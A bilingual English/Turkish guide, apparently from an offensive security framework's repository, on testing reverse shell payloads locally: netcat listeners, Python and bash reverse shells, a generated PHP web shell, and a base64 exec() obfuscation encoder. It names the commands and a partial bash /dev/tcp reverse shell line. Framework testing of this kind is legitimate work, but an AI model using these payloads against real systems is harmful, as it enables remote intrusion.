# 🧪 Payload Testing Guide / Payload Test Rehberi

[🇬🇧 English](#-english) | [🇹🇷 Türkçe](#-türkçe)

---

<a name="-english"></a>
## 🇬🇧 English

This document explains step-by-step how to test new payload modules in a local environment within Mah-Framework.

> **⚠️ Important:** Perform all testing within the virtual environment:
> ```bash
> source venv/bin/activate
> ```

---

### 🛠️ General Testing Logic

For most reverse shell tests, you need two sides:
1.  **Attacker (You):** The side listening for the connection. Usually `netcat` or the framework's own `handler` module.
2.  **Victim (Target):** Where the payload runs. You can use a separate terminal on your own machine for testing.

---

### 🐍 1. Python Payload Tests

#### `python/shell_reverse_tcp`

1.  **Start Listener (Terminal 1):**
    ```bash
    nc -lvp 4444
    ```
2.  **Create and Run Payload (Terminal 2):**
    For a quick test without opening the framework console:
    ```bash
    # Generate payload code
    python3 main.py -x "use payloads/python/shell_reverse_tcp; generate"
    
    # Copy the output code and save it to a file (e.g., test.py) or run it directly.
    # You can paste the code from the output example into your terminal and run it.
    ```
3.  **Result:** Connection should be received in Terminal 1 (`Connection received...`).

#### `python/mahpreter/reverse_tcp`

1.  **Start Handler (Terminal 1):**
    It is better to use the framework handler for Mahpreter as it uses a custom protocol.
    *Currently, you can only test raw connection with netcat.*
    ```bash
    nc -lvp 4444
    ```
2.  **Run Payload (Terminal 2):**
    ```bash
    # Run the generate.py output (test_agent.py)
    python3 test_agent.py
    ```
3.  **Result:** You should see binary data or a connection request in Terminal 1.

---

### 🌐 2. Web Shell Tests (PHP, JSP)

#### `php/reverse_tcp`

1.  **Start PHP Server (Terminal 1):**
    In your test directory:
    ```bash
    mkdir web_test
    cd web_test
    php -S 127.0.0.1:8000
    ```
2.  **Generate Payload (Terminal 2):**
    ```bash
    python3 main.py -x "use payloads/php/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; generate" > web_test/shell.php
    ```
    *(Note: Clean up any unnecessary lines printed to the screen in the output, leaving only the PHP code)*
3.  **Start Listener (Terminal 3):**
    ```bash
    nc -lvp 4444
    ```
4.  **Trigger:** Visit `http://127.0.0.1:8000/shell.php` via browser or `curl`.

---

### 🖥️ 3. Platform Specific Tests

#### `linux/bash_reverse_tcp`

1.  **Listener (Terminal 1):** `nc -lvp 4444`
2.  **Payload (Terminal 2):**
    Paste the `bash -i >& /dev/tcp/...` command received from the Framework directly into the terminal.

---

### 🛡️ 4. Encoder Test (Base64)

1.  Create `mahpreter` payload with `ENCODE base64` option.
2.  Verify the output is in `import base64; exec(base64.b64decode(...))` format.
3.  Confirm it can still establish a connection when executed.

---
---

<a name="-türkçe"></a>
## 🇹🇷 Türkçe

Bu belge, Mah-Framework içerisindeki yeni payload modüllerini yerel ortamda nasıl test edebileceğinizi adım adım açıklar.

> **⚠️ Önemli:** Tüm test işlemlerini sanal ortam içerisinde yapın:
> ```bash
> source venv/bin/activate
> ```

---

### 🛠️ Genel Test Mantığı

Çoğu reverse shell testinde iki tarafa ihtiyacınız vardır:
1.  **Saldırgan (Siz):** Bağlantıyı dinleyen taraf. Genellikle `netcat` veya framework'ün kendi `handler` modülü kullanılır.
2.  **Kurban (Hedef):** Payload'ın çalıştığı yer. Test için kendi makinenizde farklı bir terminal kullanabilirsiniz.

---

### 🐍 1. Python Payload Testleri

#### `python/shell_reverse_tcp`

1.  **Dinleyici Başlat (Terminal 1):**
    ```bash
    nc -lvp 4444
    ```
2.  **Payload Oluştur ve Çalıştır (Terminal 2):**
    Framework konsolunu açmadan hızlı test için:
    ```bash
    # Payload kodunu üret
    python3 main.py -x "use payloads/python/shell_reverse_tcp; generate"
    
    # Çıkan kodu kopyala ve ayrı bir dosyaya kaydet (örn: test.py) veya direkt çalıştır.
    # Örnek çıktıdaki kodu terminale yapıştırıp çalıştırabilirsiniz.
    ```
3.  **Sonuç:** Terminal 1'de bağlantı gelmeli (`Connection received...`).

#### `python/mahpreter/reverse_tcp`

1.  **Handler Başlat (Terminal 1):**
    Mahpreter için `netcat` yerine framework handler'ı kullanmak daha sağlıklıdır çünkü özel bir protokolü vardır.
    *Şu an için netcat ile sadece ham bağlantı testi yapabilirsiniz.*
    ```bash
    nc -lvp 4444
    ```
2.  **Payload Çalıştır (Terminal 2):**
    ```bash
    # generate.py çıktısını (test_agent.py) çalıştır
    python3 test_agent.py
    ```
3.  **Sonuç:** Terminal 1'de binary veriler veya bağlantı isteği görmelisiniz.

---

### 🌐 2. Web Shell Testleri (PHP, JSP)

#### `php/reverse_tcp`

1.  **PHP Sunucusu Başlat (Terminal 1):**
    Test klasörünüzde:
    ```bash
    mkdir web_test
    cd web_test
    php -S 127.0.0.1:8000
    ```
2.  **Payload Oluştur (Terminal 2):**
    ```bash
    python3 main.py -x "use payloads/php/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; generate" > web_test/shell.php
    ```
    *(Not: Çıktıdaki ekrana basılan gereksiz satırları temizleyip sadece PHP kodunu bırakmalısınız)*
3.  **Dinleyici Başlat (Terminal 3):**
    ```bash
    nc -lvp 4444
    ```
4.  **Tetikle:** Tarayıcıdan veya `curl` ile `http://127.0.0.1:8000/shell.php` adresine gidin.

---

### 🖥️ 3. Platform Spesifik Testleri

#### `linux/bash_reverse_tcp`

1.  **Dinleyici (Terminal 1):** `nc -lvp 4444`
2.  **Payload (Terminal 2):**
    Framework'ten aldığınız `bash -i >& /dev/tcp/...` komutunu direkt terminale yapıştırın.

---

### 🛡️ 4. Encoder Testi (Base64)

1.  `mahpreter` payload'ını `ENCODE base64` seçeneği ile oluşturun.
2.  Çıktının `import base64; exec(base64.b64decode(...))` formatında olduğunu doğrulayın.
3.  Bu kodu çalıştırdığınızda yine bağlantı kurabildiğini teyit edin.
